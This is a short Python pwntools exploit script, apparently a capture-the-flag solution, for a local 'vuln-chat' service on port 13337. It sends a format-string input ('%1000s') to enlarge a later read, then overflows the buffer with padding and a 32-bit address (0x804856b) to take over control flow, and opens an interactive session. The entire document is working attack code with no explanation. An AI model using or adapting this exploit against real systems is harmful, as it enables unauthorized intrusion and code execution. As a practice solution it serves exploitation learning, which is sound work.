#!/usr/bin/env python

from pwn import *

r = remote('127.0.0.1', 13337)
#r = process('vuln-chat')
#raw_input()
r.sendline('XXXXXXXXXXXXXXXXXXXX' + '%1000s\x00')
r.sendline('A'*0x31 + p32(0x804856b))
r.interactive()
